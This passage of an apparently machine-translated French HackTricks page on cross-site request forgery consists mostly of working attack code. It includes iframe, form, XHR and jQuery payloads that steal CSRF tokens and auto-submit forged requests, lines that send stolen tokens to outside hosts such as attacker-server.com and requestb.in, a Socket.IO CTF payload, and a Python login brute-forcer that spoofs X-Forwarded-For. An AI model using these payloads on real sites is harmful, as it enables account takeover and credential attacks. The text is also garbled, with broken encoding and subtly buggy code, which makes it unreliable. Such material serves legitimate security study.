xhr.send("token=" + token + "&otherparama=heyyyy");
}

function getTokenJS() {
var xhr = new XMLHttpRequest();
// This tels it to return it as a HTML document
xhr.responseType = "document";
xhr.withCredentials = true;
// true on the end of here makes the call asynchronous
xhr.open("GET", GET_URL, true);
xhr.onload = function (e) {
if (xhr.readyState === XMLHttpRequest.DONE && xhr.status === 200) {
// Get the document from the response
page = xhr.response
// Get the input element
input = page.getElementById("token");
// Show the token
//console.log("The token is: " + input.value);
// Use the token to submit the form
submitFormWithTokenJS(input.value);
}
};
// Make the request
xhr.send(null);
}

var GET_URL="http://google.com?param=VALUE"
var POST_URL="http://google.com?param=VALUE"
getTokenJS();
```
### **Vol de jeton CSRF et envoi d'une requ√™te POST √† l'aide d'un iframe, d'un formulaire et d'Ajax**

L'une des m√©thodes couramment utilis√©es pour exploiter une vuln√©rabilit√© de falsification de requ√™te intersite (CSRF) consiste √† voler le jeton CSRF d'un utilisateur l√©gitime et √† l'utiliser pour envoyer une requ√™te POST malveillante. Cette attaque peut √™tre r√©alis√©e en utilisant un iframe, un formulaire ou Ajax.

#### **1. Vol du jeton CSRF**

Pour voler le jeton CSRF, l'attaquant peut utiliser diff√©rentes techniques, telles que l'inclusion d'un lien malveillant dans un e-mail ou une page Web, ou l'exploitation d'une vuln√©rabilit√© de script intersite (XSS) pour extraire le jeton √† partir de la page Web.

#### **2. Envoi d'une requ√™te POST avec un iframe**

Une fois que l'attaquant a r√©ussi √† voler le jeton CSRF, il peut l'utiliser pour envoyer une requ√™te POST malveillante en utilisant un iframe. L'attaquant cr√©e un iframe invisible dans une page Web et d√©finit l'URL de la cible comme la cible de l'action du formulaire. Ensuite, l'attaquant utilise JavaScript pour remplir le formulaire avec les donn√©es n√©cessaires, y compris le jeton CSRF vol√©, et soumet le formulaire automatiquement.

```html
<iframe style="display:none" name="csrf-frame"></iframe>
<form action="https://www.example.com/target-page" method="POST" target="csrf-frame" id="csrf-form">
  <input type="hidden" name="csrf_token" value="TOKEN_VALUE">
  <!-- Autres champs de formulaire n√©cessaires -->
</form>
<script>
  document.getElementById('csrf-form').submit();
</script>
```

#### **3. Envoi d'une requ√™te POST avec un formulaire**

Une autre m√©thode consiste √† utiliser un formulaire pour envoyer la requ√™te POST malveillante. L'attaquant cr√©e un formulaire cach√© dans une page Web et d√©finit l'URL de la cible comme la cible de l'action du formulaire. Ensuite, l'attaquant utilise JavaScript pour remplir le formulaire avec les donn√©es n√©cessaires, y compris le jeton CSRF vol√©, et soumet le formulaire automatiquement.

```html
<form action="https://www.example.com/target-page" method="POST" id="csrf-form">
  <input type="hidden" name="csrf_token" value="TOKEN_VALUE">
  <!-- Autres champs de formulaire n√©cessaires -->
</form>
<script>
  document.getElementById('csrf-form').submit();
</script>
```

#### **4. Envoi d'une requ√™te POST avec Ajax**

Enfin, l'attaquant peut utiliser Ajax pour envoyer la requ√™te POST malveillante. L'attaquant cr√©e une requ√™te Ajax en utilisant JavaScript et d√©finit l'URL de la cible, les donn√©es √† envoyer (y compris le jeton CSRF vol√©) et la m√©thode POST. Ensuite, l'attaquant envoie la requ√™te Ajax pour ex√©cuter l'attaque CSRF.

```javascript
var xhr = new XMLHttpRequest();
xhr.open('POST', 'https://www.example.com/target-page', true);
xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
xhr.send('csrf_token=TOKEN_VALUE&other_data=DATA_VALUE');
```

Il est important de noter que ces m√©thodes d'attaque CSRF peuvent √™tre d√©tect√©es et pr√©venues en utilisant des techniques de d√©fense appropri√©es, telles que l'utilisation de jetons CSRF avec des dur√©es de validit√© courtes, la v√©rification de l'en-t√™te Referer, l'utilisation de cookies s√©curis√©s et l'impl√©mentation de m√©canismes de confirmation de l'action de l'utilisateur.
```markup
<form id="form1" action="http://google.com?param=VALUE" method="post" enctype="multipart/form-data">
<input type="text" name="username" value="AA">
<input type="checkbox" name="status" checked="checked">
<input id="token" type="hidden" name="token" value="" />
</form>

<script type="text/javascript">
function f1(){
x1=document.getElementById("i1");
x1d=(x1.contentWindow||x1.contentDocument);
t=x1d.document.getElementById("token").value;

document.getElementById("token").value=t;
document.getElementById("form1").submit();
}
</script>
<iframe id="i1" style="display:none" src="http://google.com?param=VALUE" onload="javascript:f1();"></iframe>
```
### **Vol de jeton CSRF et envoi d'une requ√™te POST √† l'aide d'un iframe et d'un formulaire**

To perform a Cross-Site Request Forgery (CSRF) attack, an attacker needs to steal the victim's CSRF token and use it to send unauthorized requests on behalf of the victim. One way to achieve this is by using an iframe and a form.

Pour effectuer une attaque de falsification de requ√™te entre sites (CSRF), un attaquant doit voler le jeton CSRF de la victime et l'utiliser pour envoyer des requ√™tes non autoris√©es au nom de la victime. Une fa√ßon d'y parvenir est d'utiliser un iframe et un formulaire.

1. The attacker creates a malicious webpage that contains an iframe pointing to the target website.

   L'attaquant cr√©e une page web malveillante contenant un iframe pointant vers le site cible.

   ```html
   <iframe src="https://www.target-website.com"></iframe>
   ```

2. The attacker also includes a hidden form within the iframe, pre-filled with the victim's CSRF token and the desired malicious action.

   L'attaquant inclut √©galement un formulaire cach√© dans l'iframe, pr√©-rempli avec le jeton CSRF de la victime et l'action malveillante souhait√©e.

   ```html
   <form action="https://www.target-website.com/action" method="POST">
     <input type="hidden" name="csrf_token" value="victim-csrf-token">
     <input type="hidden" name="malicious_action" value="perform-malicious-action">
   </form>
   ```

3. When the victim visits the attacker's webpage, the iframe loads the target website, and the hidden form is automatically submitted.

   Lorsque la victime visite la page web de l'attaquant, l'iframe charge le site cible et le formulaire cach√© est automatiquement soumis.

4. Since the form is submitted within the context of the target website, the victim's browser includes the victim's CSRF token in the request, making it appear as a legitimate request.

   √âtant donn√© que le formulaire est soumis dans le contexte du site cible, le navigateur de la victime inclut le jeton CSRF de la victime dans la requ√™te, ce qui la rend semblable √† une requ√™te l√©gitime.

5. The target website processes the request, unaware that it was initiated by the attacker, and performs the malicious action on behalf of the victim.

   Le site cible traite la requ√™te, sans se rendre compte qu'elle a √©t√© initi√©e par l'attaquant, et effectue l'action malveillante au nom de la victime.

By exploiting CSRF vulnerabilities, attackers can trick users into unknowingly performing actions on websites they trust. To protect against CSRF attacks, web developers should implement measures such as using CSRF tokens, checking the origin of requests, and implementing strict access controls.
```markup
<iframe id="iframe" src="http://google.com?param=VALUE" width="500" height="500" onload="read()"></iframe>

<script>
function read()
{
var name = 'admin2';
var token = document.getElementById("iframe").contentDocument.forms[0].token.value;
document.writeln('<form width="0" height="0" method="post" action="http://www.yoursebsite.com/check.php"  enctype="multipart/form-data">');
document.writeln('<input id="username" type="text" name="username" value="' + name + '" /><br />');
document.writeln('<input id="token" type="hidden" name="token" value="' + token + '" />');
document.writeln('<input type="submit" name="submit" value="Submit" /><br/>');
document.writeln('</form>');
document.forms[0].submit.click();
}
</script>
```
### **Vol de jeton et envoi via 2 iframes**

To perform a Cross-Site Request Forgery (CSRF) attack, one common technique is to steal the victim's authentication token and send it to the attacker's server using two iframes.

#### **Step 1: Stealing the Token**

The first step is to find a way to steal the victim's authentication token. This can be done by tricking the victim into visiting a malicious website or by exploiting a vulnerability in a trusted website.

#### **Step 2: Sending the Token**

Once the token is stolen, it needs to be sent to the attacker's server. This can be achieved by creating two iframes on the malicious website. The first iframe is used to load the target website, while the second iframe is used to send the stolen token to the attacker's server.

```html
<iframe src="https://www.target-website.com"></iframe>
<iframe src="https://www.attacker-server.com/steal-token?token=<stolen-token>"></iframe>
```

In the above example, the first iframe loads the target website, making it appear as if the victim is interacting with the legitimate site. Meanwhile, the second iframe sends the stolen token to the attacker's server by including it as a parameter in the URL.

#### **Step 3: Exploiting the Stolen Token**

Once the attacker receives the stolen token, they can use it to perform actions on behalf of the victim. This can include making unauthorized requests, changing account settings, or even performing financial transactions.

It is important for developers to implement proper CSRF protection mechanisms, such as using anti-CSRF tokens or implementing same-site cookies, to prevent these types of attacks. Additionally, users should be cautious when visiting unfamiliar websites and ensure they are using secure and up-to-date browsers.
```markup
<script>
var token;
function readframe1(){
token = frame1.document.getElementById("profile").token.value;
document.getElementById("bypass").token.value = token
loadframe2();
}
function loadframe2(){
var test = document.getElementbyId("frame2");
test.src = "http://requestb.in/1g6asbg1?token="+token;
}
</script>

<iframe id="frame1" name="frame1" src="http://google.com?param=VALUE" onload="readframe1()"
sandbox="allow-same-origin allow-scripts allow-forms allow-popups allow-top-navigation"
height="600" width="800"></iframe>

<iframe id="frame2" name="frame2"
sandbox="allow-same-origin allow-scripts allow-forms allow-popups allow-top-navigation"
height="600" width="800"></iframe>
<body onload="document.forms[0].submit()">
<form id="bypass" name"bypass" method="POST" target="frame2" action="http://google.com?param=VALUE" enctype="multipart/form-data">
<input type="text" name="username" value="z">
<input type="checkbox" name="status" checked="">
<input id="token" type="hidden" name="token" value="0000" />
<button type="submit">Submit</button>
</form>
```
### **POSTSteal CSRF token with Ajax and send a post with a form**

### **POSTVoler le jeton CSRF avec Ajax et envoyer une requ√™te POST avec un formulaire**

To perform a Cross-Site Request Forgery (CSRF) attack, an attacker needs to steal the CSRF token from the target website and then use it to send malicious requests on behalf of the victim.

Pour effectuer une attaque de falsification de requ√™te entre sites (CSRF), un attaquant doit voler le jeton CSRF du site cible, puis l'utiliser pour envoyer des requ√™tes malveillantes au nom de la victime.

One way to steal the CSRF token is by using Ajax to make a request to the target website and extract the token from the response.

Une fa√ßon de voler le jeton CSRF consiste √† utiliser Ajax pour effectuer une requ√™te vers le site cible et extraire le jeton de la r√©ponse.

```javascript
$.ajax({
    url: 'https://target-website.com',
    type: 'GET',
    success: function(response) {
        var csrfToken = $(response).find('input[name="csrf_token"]').val();
        // Send the stolen CSRF token to the attacker's server
        $.post('https://attacker-server.com', { token: csrfToken });
    }
});
```

```javascript
$.ajax({
    url: 'https://site-cible.com',
    type: 'GET',
    success: function(response) {
        var csrfToken = $(response).find('input[name="csrf_token"]').val();
        // Envoyer le jeton CSRF vol√© au serveur de l'attaquant
        $.post('https://serveur-de-lattaquant.com', { token: csrfToken });
    }
});
```

Once the attacker has obtained the CSRF token, they can use it to craft a malicious form and submit it to the target website.

Une fois que l'attaquant a obtenu le jeton CSRF, il peut l'utiliser pour cr√©er un formulaire malveillant et le soumettre au site cible.

```javascript
var maliciousForm = $('<form action="https://target-website.com" method="POST">' +
    '<input type="hidden" name="csrf_token" value="' + csrfToken + '">' +
    '<input type="hidden" name="action" value="delete_account">' +
    '</form>');

$('body').append(maliciousForm);
maliciousForm.submit();
```

```javascript
var formulaireMalveillant = $('<form action="https://site-cible.com" method="POST">' +
    '<input type="hidden" name="csrf_token" value="' + csrfToken + '">' +
    '<input type="hidden" name="action" value="supprimer_compte">' +
    '</form>');

$('body').append(formulaireMalveillant);
formulaireMalveillant.submit();
```

By submitting the malicious form, the attacker can trick the victim's browser into performing actions on the target website without their knowledge or consent.

En soumettant le formulaire malveillant, l'attaquant peut tromper le navigateur de la victime pour qu'il effectue des actions sur le site cible sans son consentement ni sa connaissance.
```markup
<body onload="getData()">

<form id="form" action="http://google.com?param=VALUE" method="POST" enctype="multipart/form-data">
<input type="hidden" name="username" value="root"/>
<input type="hidden" name="status" value="on"/>
<input type="hidden" id="findtoken" name="token" value=""/>
<input type="submit" value="valider"/>
</form>

<script>
var x = new XMLHttpRequest();
function getData() {
x.withCredentials = true;
x.open("GET","http://google.com?param=VALUE",true);
x.send(null);
}
x.onreadystatechange = function() {
if (x.readyState == XMLHttpRequest.DONE) {
var token = x.responseText.match(/name="token" value="(.+)"/)[1];
document.getElementById("findtoken").value = token;
document.getElementById("form").submit();
}
}
</script>
```
### CSRF avec Socket.IO

Socket.IO est une biblioth√®que JavaScript qui permet la communication en temps r√©el entre le serveur et le client. Elle est souvent utilis√©e dans les applications web pour cr√©er des fonctionnalit√©s en temps r√©el telles que les chats en direct ou les mises √† jour en direct.

Cependant, Socket.IO peut √©galement √™tre vuln√©rable aux attaques de falsification de requ√™te intersite (CSRF). Une attaque CSRF se produit lorsque le navigateur d'un utilisateur authentifi√© envoie une requ√™te non autoris√©e √† un site web sans que l'utilisateur en soit conscient.

Pour exploiter une vuln√©rabilit√© CSRF avec Socket.IO, un attaquant peut utiliser une page web malveillante pour envoyer une requ√™te WebSocket √† un serveur Socket.IO. Cette requ√™te peut contenir des instructions malveillantes qui seront ex√©cut√©es par le serveur.

Pour se prot√©ger contre les attaques CSRF avec Socket.IO, il est recommand√© d'utiliser des jetons anti-CSRF. Ces jetons sont g√©n√©r√©s par le serveur et inclus dans les requ√™tes WebSocket. Le serveur v√©rifie ensuite si le jeton est valide avant de traiter la requ√™te.

En utilisant des jetons anti-CSRF, il devient beaucoup plus difficile pour un attaquant de mener une attaque CSRF r√©ussie avec Socket.IO. Cependant, il est important de noter que la mise en ≈ìuvre correcte des jetons anti-CSRF est essentielle pour assurer une protection efficace contre les attaques CSRF.
```markup
<script src="https://cdn.jsdelivr.net/npm/socket.io-client@2/dist/socket.io.js"></script>
<script>
let socket = io('http://six.jh2i.com:50022/test');

const username = 'admin'

socket.on('connect', () => {
console.log('connected!');
socket.emit('join', {
room: username
});
socket.emit('my_room_event', {
data: '!flag',
room: username
})

});
</script>
```
## CSRF Brute Force de Connexion

Le code peut √™tre utilis√© pour effectuer une attaque de force brute sur un formulaire de connexion en utilisant un jeton CSRF (il utilise √©galement l'en-t√™te X-Forwarded-For pour tenter de contourner un √©ventuel blocage d'adresse IP) :
```python
import request
import re
import random

URL = "http://10.10.10.191/admin/"
PROXY = { "http": "127.0.0.1:8080"}
SESSION_COOKIE_NAME = "BLUDIT-KEY"
USER = "fergus"
PASS_LIST="./words"

def init_session():
#Return CSRF + Session (cookie)
r = requests.get(URL)
csrf = re.search(r'input type="hidden" id="jstokenCSRF" name="tokenCSRF" value="([a-zA-Z0-9]*)"', r.text)
csrf = csrf.group(1)
session_cookie = r.cookies.get(SESSION_COOKIE_NAME)
return csrf, session_cookie

def login(user, password):
print(f"{user}:{password}")
csrf, cookie = init_session()
cookies = {SESSION_COOKIE_NAME: cookie}
data = {
"tokenCSRF": csrf,
"username": user,
"password": password,
"save": ""
}
headers = {
"X-Forwarded-For": f"{random.randint(1,256)}.{random.randint(1,256)}.{random.randint(1,256)}.{random.randint(1,256)}"
}
r = requests.post(URL, data=data, cookies=cookies, headers=headers, proxies=PROXY)
if "Username or password incorrect" in r.text:
return False
else:
print(f"FOUND {user} : {password}")
return True

with open(PASS_LIST, "r") as f:
for line in f:
login(USER, line.strip())
```
## Outils <a href="#outils" id="outils"></a>

* [https://github.com/0xInfection/XSRFProbe](https://github.com/0xInfection/XSRFProbe)
* [https://github.com/merttasci/csrf-poc-generator](https://github.com/merttasci/csrf-poc-generator)

## R√©f√©rences

* [https://portswigger.net/web-security/csrf](https://portswigger.net/web-security/csrf)
* [https://www.hahwul.com/2019/10/bypass-referer-check-logic-for-csrf.html](https://www.hahwul.com/2019/10/bypass-referer-check-logic-for-csrf.html)

‚Äã

<figure><img src="../../.gitbook/assets/image (1) (3) (1).png" alt=""><figcaption></figcaption></figure>

Rejoignez le serveur [**HackenProof Discord**](https://discord.com/invite/N3FrSbmwdy) pour communiquer avec des hackers exp√©riment√©s et des chasseurs de primes en s√©curit√© !

**Perspectives de piratage**\
Engagez-vous avec du contenu qui explore les sensations et les d√©fis du piratage

**Actualit√©s de piratage en temps r√©el**\
Restez √† jour avec le monde du piratage en √©volution rapide gr√¢ce aux actualit√©s et aux informations en temps r√©el

**Derni√®res annonces**\
Restez inform√© des derni√®res primes de bugs lanc√©es et des mises √† jour cruciales de la plateforme

**Rejoignez-nous sur** [**Discord**](https://discord.com/invite/N3FrSbmwdy) et commencez √† collaborer avec les meilleurs hackers d√®s aujourd'hui !

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>üê¶ Twitter üê¶</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>üéôÔ∏è Twitch üéôÔ∏è</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>üé• Youtube üé•</strong></a></summary>

* Travaillez-vous dans une **entreprise de cybers√©curit√©** ? Voulez-vous voir votre **entreprise annonc√©e dans HackTricks** ? ou voulez-vous avoir acc√®s √† la **derni√®re version de PEASS ou t√©l√©charger HackTricks en PDF** ? Consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop) !
* D√©couvrez [**The PEASS Family**](https://opensea.io/collection/the-peass-family), notre collection exclusive de [**NFT**](https://opensea.io/collection/the-peass-family)
* Obtenez le [**swag officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* **Rejoignez le** [**üí¨**](https://emojipedia.org/speech-balloon/) [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe Telegram**](https://t.me/peass) ou **suivez** moi sur **Twitter** [**üê¶**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Partagez vos astuces de piratage en soumettant des PR au** [**repo hacktricks**](https://github.com/carlospolop/hacktricks) **et au** [**repo hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
